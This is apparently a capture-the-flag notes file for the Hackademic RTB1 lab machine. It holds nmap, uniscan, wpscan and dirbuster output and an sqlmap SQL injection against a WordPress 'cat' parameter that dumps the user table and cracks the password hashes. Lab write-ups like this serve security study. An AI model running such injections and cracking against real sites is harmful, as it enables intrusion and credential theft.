@@ -1,0 +1,251 @@
+Hackademix.RTB1
+time taken: ~
+
+nmap:
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-28 05:44 MDT
+Nmap scan report for ctf06.root-me.org (212.83.142.83)
+Host is up (0.042s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 ea:25:b4:bf:7e:08:80:07:e8:63:2c:7c:06:e6:d2:a6 (DSA)
+|_  2048 cc:73:f6:cb:3b:28:d2:c6:2a:14:77:b2:09:d1:1a:43 (RSA)
+80/tcp open  http    Apache httpd 2.2.15 ((Fedora))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.2.15 (Fedora)
+|_http-title: Hackademic.RTB1  
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: bridge|general purpose
+Running (JUST GUESSING): Oracle Virtualbox (98%), QEMU (95%)
+OS CPE: cpe:/o:oracle:virtualbox cpe:/a:qemu:qemu
+Aggressive OS guesses: Oracle Virtualbox (98%), QEMU user mode network gateway (95%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   1.47 ms 10.0.2.2
+2   1.51 ms ctf06.root-me.org (212.83.142.83)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.87 seconds
+
+
+seems to be running wordpress as CMS:
+
+<meta name="generator" content="WordPress 1.5.1.1" />
+uniscan:
+
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+
+
+Scan date: 28-5-2017 5:55:37
+===================================================================================================
+| Domain: http://ctf06.root-me.org/
+| Server: Apache/2.2.15 (Fedora)
+| IP: 212.83.142.83
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://ctf06.root-me.org/icons/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://ctf06.root-me.org/error/HTTP_NOT_FOUND.html.var
+| [+] CODE: 200 URL: http://ctf06.root-me.org/index.html
+| [+] CODE: 200 URL: http://ctf06.root-me.org/index.html~
+===================================================================================================
+|
+| Check robots.txt:
+|
+| Check sitemap.xml:
+===================================================================================================
+|
+| Crawler Started:
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| Plugin name: External Host Detect v.1.2 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+| [+] Crawling finished, 20 URL's found!
+|
+| File Upload Forms:
+|
+| Source Code Disclosure:
+|
+| FCKeditor File Upload:
+|
+| Timthumb:
+|
+| PHPinfo() Disclosure:
+|
+| External hosts:
+| [+] External Host Found: http://www.p0wnbox.com
+| [+] External Host Found: http://httpd.apache.org
+|
+| Web Backdoors:
+|
+| E-mails:
+| [+] E-mail Found: mike@hyperreal.org
+| [+] E-mail Found: kevinh@kevcom.com
+|
+
+
+dick around with url bar until:
+
+WordPress database error: [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\\' LIMIT 1' at line 1]
+SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1
+
+
+sqlmap -u "ctf06.root-me.org/Hackademic_RTB1/?cat=1" --dbs --dump
+
+[05:46:07] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')
+[05:46:07] [INFO] testing for SQL injection on GET parameter 'cat'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[05:51:33] [INFO] GET parameter 'cat' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[05:51:56] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
+
+
+.
+.Database: wordpress
+Table: wp_post2cat
+[4 entries]
++--------+---------+-------------+
+| rel_id | post_id | category_id |
++--------+---------+-------------+
+| 4      | 4       | 1           |
+| 6      | 6       | 1           |
+| 7      | 7       | 1           |
+| 9      | 9       | 1           |
++--------+---------+-------------+
+
+Database: wordpress
+Table: wp_users
+[6 entries]
++----+-------------+---------+----------+----------+----------+----------+----------+---------------------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+
+| ID | user_idmode | user_ip | user_icq | user_msn | user_yim | user_url | user_aim | user_pass                                   | user_login   | user_level | user_email              | user_status | user_domain | user_browser | user_nicename | user_nickname | user_lastname | user_firstname | user_registered     | user_description | user_activation_key |
++----+-------------+---------+----------+----------+----------+----------+----------+---------------------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+
+| 1  | login       | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | 21232f297a57a5a743894a0e4a801fc3 (admin)    | NickJames    | 1          | NickJames@hacked.com    | 0           | <blank>     | <blank>      | nickjames     | NickJames     | James         | Nick           | 2010-10-25 20:40:23 | <blank>          | <blank>             |
+| 2  | login       | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | b986448f0bb9e5e124ca91d3d650f52c            | JohnSmith    | 0          | JohnSmith@hacked        | 0           | <blank>     | <blank>      | johnsmith     | JohnSmith     | Smith         | John           | 2010-10-25 21:25:22 | <blank>          | <blank>             |
+| 3  | nickname    | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   | GeorgeMiller | 10         | GeorgeMiller@hacked.com | 0           | <blank>     | <blank>      | georgemiller  | GeorgeMiller  | Miller        | George         | 2011-01-07 03:08:51 | <blank>          | <blank>             |
+| 4  | nickname    | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | a6e514f9486b83cb53d8d932f9a04292 (napoleon) | TonyBlack    | 0          | TonyBlack@hacked.com    | 0           | <blank>     | <blank>      | tonyblack     | TonyBlack     | Black         | Tony           | 2011-01-07 03:09:55 | <blank>          | <blank>             |
+| 5  | nickname    | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  | JasonKonnors | 0          | JasonKonnors@hacked.com | 0           | <blank>     | <blank>      | jasonkonnors  | JasonKonnors  | Konnors       | Jason          | 2011-01-07 03:10:36 | <blank>          | <blank>             |
+| 6  | nickname    | <blank> | 0        | <blank>  | <blank>  | http://  | <blank>  | 50484c19f1afdaf3841a0d821ed393d2 (kernel)   | MaxBucky     | 0          | MaxBucky@hacked.com     | 0           | <blank>     | <blank>      | maxbucky      | MaxBucky      | Bucky         | Max            | 2011-01-07 03:11:18 | <blank>          | <blank>             |
++----+-------------+---------+----------+----------+----------+----------+----------+---------------------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+------------
+
+| 0       | 25        | 20           | Y                   | yes      | default_category                        | 1           | O:9:"MagpieRSS":19:{s:6:"parser";i:0;s:12:"current_item";a:0:{}s:5:"items";a:10:{i:0;a:9:{s:5:"title";s:34:"CES 2011 Exhibition Hall Showcase ";s:6:"author";s:11:"gearheadgal";s:4:"link";s:59:"http://feeds09.technorati.com/~r/trarticles/~3/fwldOnZrlbA/";s:4:"guid";s:75:"http://technorati.com/technology/article/ces-2011-exhibition-hall-showcase/";s:11:"description";s:134:"A Video Peek At The Gadget 'Hood at CES 2011<img src="http://feeds.feedburner.com/~r/trarticles/~4/fwldOnZrlbA" height="1" width="1"/>";s:7:"pubdate";s:31:"Sun, 09 Jan 2011 02:27:22 +0000";s:8:"category";s:93:"TechnologyaudiblackberrycesConsumer ElectronicsfordgadgetsintelmicrosoftQualcommRIMtechnology";s:10:"feedburner";a:1:{s:8:"origlink";s:75:"http://technorati.com/technology/article/ces-2011-exhibition-hall-showcase/";}s:7:"summary";s:134:"A Video Peek At The Gadget 'Hood at CES 2011<img src="http://feeds.feedburner.com/~r/trarticles/~4/fwldOnZrlbA" height="1" width="1"/>";}i:1;a:9:{s:5:"title";s:29:"Are Western Mothers Inferior?";s:6:"author";s:15:"parentgrapevine";s:4:"link";s:59:"http://feeds09.technorati.com/~r/trarticles/~3/lKpJZGtF3dg/";s:4:"guid";s:65:"http://technorati.com/women/article/are-western-mothers-inferior/";s:11:"description";s:132:"Do Westerners Need To Practice Tough Love?<img src="http://feeds.feedburner.com/~r/trarticles/~4/lKpJZGtF3dg" height="1" width="1"/>";s:7:"pubdate";s:31:"Sun, 09 Jan 2011 02:25:14 +0000";s:8:"category";s:143:"Technorati WomenAmy ChuaAre Western Mothers InferiorBattle Hymn of the Tiger MotherChinese Mothers Are SuperiorEducation SystemParent Grapevine";s:10:"feedburner";a:1:{s:8:"origlink";s:65:"http://technorati.com/women/article/are-western-mothers-inferior/";}s:7:"summary";s:132:"Do Westerners Need To Practice Tough Love?<img src="http://feeds.feedburner.com/~r/trarticles/~4/lKpJZGtF3dg" height="1" width="1"/>";}i:2;a:9:{s:5:"title";s:62:"Independent Lens Presents  Children of Haiti, January 11, 2011";s:6:"author";s:12:"missbobetier";s:4:"link";s:59:"http://feeds09.technorati.com/~r/trarticles/~3/5MJxwFjAdQg/";s:4:"guid";s:91:"http://technorati.com/entertainment/tv/article/independent-lens-presents-children-of-haiti/";s:11:"description";s:178:"Nearly a million homeless children wander the city streets of Haiti,is there a solution?<img src="http://feeds.feedburner.com/~r/trarticles/~4/5MJxwFjAdQg" height="1" width="1"/>";s:7:"pubdate";s:31:"Sun, 09 Jan 2011 01:13:05 +0000";s:8:"category";s:167:"TVa view from the idAlexandria HammondCap-HaitienchildrenChildren of HaitidocumentaryearthquakefilmhomelessindependentIndependent Lensindiemoviepbspovertypreviewreview";s:10:"feedburner";a:1:{s:8:"origlink";s:91:"http://technorati.com/entertainment/tv/article/independent-lens-presents-children-of-haiti/";}s:7:"summary";s:178:"Nearly a million homeless children wander the city streets of Haiti,is there a solution?<img src="http://feeds.feedburner.com/~r/trarticles/~4/5MJxwFjAdQg" height="1" width="1"/>";}i:3;a:9:{s:5:"title";s:47:"Counting the Cost of Violent Political Rhetoric";s:6:"author";s:9:"howertons";s:4:"link";s:59:"http://feeds09.technorati.com/~r/trarticles/~3/dZnHWwc6fhU/";s:4:"guid";s:78:"http://technorati.com/politics/article/counting-the-cost-of-violent-political/";s:11:"description";s:150:"Should we tolerate violent metaphors in political discourse?<img src="http://feeds.feedburner.com/~r/trarticles/~4/dZnHWwc6fhU" height="1" width="1"/>";s:7:"pubdate";s:31:"Sun, 09 Jan 2011 01:13:00 +0000";s:8:"category";s:68:"PoliticsArizonaGabrielle Giffordsglenn-beckjared laughlinsarah-palin";s:10:"feedburner";a:1:{s:8:"origlink";s:78:"http://technorati.com/politics/article/counting-the-cost-of-violent-political/";}s:7:"summary";s:150:"Should we tolerate violent metaphors in political discourse?<img src="http://feeds.feedburner.com/~r/trarticles/~4/dZnHWwc6fhU" height="1" width="1"/>";}i:4;a:9:{s:5:"title";s:38:"Roseanne Barr: I Was a Facebook Addict";s:6:"author";s:9:"johnjegan";s:4:"link";s:59:"http://feeds09.technorati.com/~r/trarticles/~3/TXJFiF2Rmi0/";s:4:"guid";s:78:"http://technorati.com/entertainment/tv/article/roseanne-barr-i-was-a-facebook/";s:11:"description";s:148:"Comedienne and Author Takes Aim at ‘Twittering  
+.
+
+Database: wordpress
+Table: wp_linkcategories
+[1 entry]
++--------+----------+-----------+------------+------------+-------------+-------------+-------------+--------------+----------------+-----------------+------------------+------------------+
+| cat_id | cat_name | sort_desc | list_limit | sort_order | show_rating | auto_toggle | show_images | show_updated | text_after_all | text_after_link | text_before_link | show_description |
++--------+----------+-----------+------------+------------+-------------+-------------+-------------+--------------+----------------+-----------------+------------------+------------------+
+| 1      | Blogroll | N         | -1         | rand       | Y           | N           | Y           | Y            | </li>          | <br />          | <li>             | N                |
++--------+----------+-----------+------------+------------+-------------+-------------+-------------+--------------+----------------+-----------------+------------------+------------------+
+
+
+Database: wordpress
+Table: wp_postmeta
+[1 entry]
++---------+---------+-------------------+------------+
+| post_id | meta_id | meta_key          | meta_value |
++---------+---------+-------------------+------------+
+| 6       | 1       | _wp_page_template | default    |
++---------+---------+-------------------+------------+
+
+Database: wordpress
+Table: wp_categories
+[1 entry]
++--------+---------------+-----------------+-------------------+----------------------+
+| cat_ID | cat_name      | category_parent | category_nicename | category_description |
++--------+---------------+-----------------+-------------------+----------------------+
+| 1      | Uncategorized | 0               | uncategorized     | <blank>              |
++--------+---------------+-----------------+-------------------+----------------------+
+
+WORDPRESS LOGINS:
+[05:59:42] [INFO] cracked password 'admin' for user 'NickJames' nickjames
+                                                                                                                               [05:59:44] [INFO] cracked password 'kernel' for user 'MaxBucky' maxbucky
+                                                                                                                               [05:59:46] [INFO] cracked password 'maxwell' for user 'JasonKonnors' jasonkonnors
+                                                                                                                               [05:59:46] [INFO] cracked password 'napoleon' for user 'TonyBlack' tonyblack
+                                                                                                                               [05:59:47] [INFO] cracked password 'q1w2e3' for user 'GeorgeMiller' georgemiller
+                                                                                                                               [05:59:48] [INFO] postprocessing table dump
+
+none seem to work for ssh....
+
+http://ctf06.root-me.org/Hackademic_RTB1/xmlrpc.php
+XML-RPC server accepts POST requests only.
+
+hmm...
+
+http://ctf06.root-me.org/Hackademic_RTB1/?feed=atom --> blog
+
+nothing from wpscan aside from:
+[+] WordPress theme in use: starburst
+
+[+] Name: starburst
+ |  Latest version: 1.1 
+ |  Location: http://ctf06.root-me.org/wp-content/themes/starburst/
+ |  Style URL: http://ctf06.root-me.org/wp-content/themes/starburst/style.css
+ |  Referenced style.css: wp-content/themes/starburst/style.css
+
+dirbuster found a shitload of wordpress endpoints:
+Dir found: /Hackademic_RTB1/wp-content/ - 200
+Dir found: /Hackademic_RTB1/wp-includes/ - 200
+Dir found: /Hackademic_RTB1/wp-content/plugins/ - 200
+File found: /Hackademic_RTB1/wp-includes/class-IXR.php - 200
+Dir found: /Hackademic_RTB1/wp-content/themes/ - 200
+File found: /Hackademic_RTB1/wp-includes/class-pop3.php - 200
+File found: /Hackademic_RTB1/wp-includes/class-snoopy.php - 200
+File found: /Hackademic_RTB1/wp-content/plugins/hello.php - 500
+File found: /Hackademic_RTB1/wp-includes/classes.php - 500
+Dir found: /Hackademic_RTB1/wp-content/themes/classic/ - 500
+File found: /Hackademic_RTB1/wp-content/plugins/markdown.php - 200
+File found: /Hackademic_RTB1/wp-includes/comment-functions.php - 200
+Dir found: /Hackademic_RTB1/wp-content/themes/default/ - 500
+File found: /Hackademic_RTB1/wp-content/plugins/textile1.php - 500
+File found: /Hackademic_RTB1/wp-includes/default-filters.php - 500
+Dir found: /Hackademic_RTB1/wp-content/themes/starburst/ - 500
+File found: /Hackademic_RTB1/wp-includes/feed-functions.php - 200
+File found: /Hackademic_RTB1/wp-includes/functions-compat.php - 200
+File found: /Hackademic_RTB1/wp-includes/functions-formatting.php - 200
+File found: /Hackademic_RTB1/wp-includes/functions-post.php - 200
+File found: /Hackademic_RTB1/wp-includes/functions.php - 200
+File found: /Hackademic_RTB1/wp-includes/gettext.php - 200
+File found: /Hackademic_RTB1/wp-includes/kses.php - 200
+File found: /Hackademic_RTB1/wp-includes/links.php - 200
+File found: /Hackademic_RTB1/wp-includes/locale.php - 500
+File found: /Hackademic_RTB1/wp-includes/pluggable-functions.php - 200
+File found: /Hackademic_RTB1/wp-includes/rss-functions.php - 200
+File found: /Hackademic_RTB1/wp-includes/streams.php - 200
+File found: /Hackademic_RTB1/wp-includes/template-functions-author.php - 200
+File found: /Hackademic_RTB1/wp-includes/template-functions-category.php - 200
+File found: /Hackademic_RTB1/wp-includes/template-functions-general.php - 200
+File found: /Hackademic_RTB1/wp-includes/template-functions-links.php - 200
+File found: /Hackademic_RTB1/wp-includes/template-functions-post.php - 200
+File found: /Hackademic_RTB1/wp-includes/vars.php - 500
+File found: /Hackademic_RTB1/wp-includes/version.php - 200
+File found: /Hackademic_RTB1/wp-includes/wp-l10n.php - 200
+File found: /Hackademic_RTB1/wp.php - 200
+File found: /Hackademic_RTB1/wp-login.php - 200
+File found: /Hackademic_RTB1/wp-register.php - 200
+File found: /Hackademic_RTB1/wp-rss2.php - 200
+File found: /Hackademic_RTB1/xmlrpc.php - 200
+File found: /Hackademic_RTB1/wp-includes/wp-db.php - 200
+
+
+
+
+
+
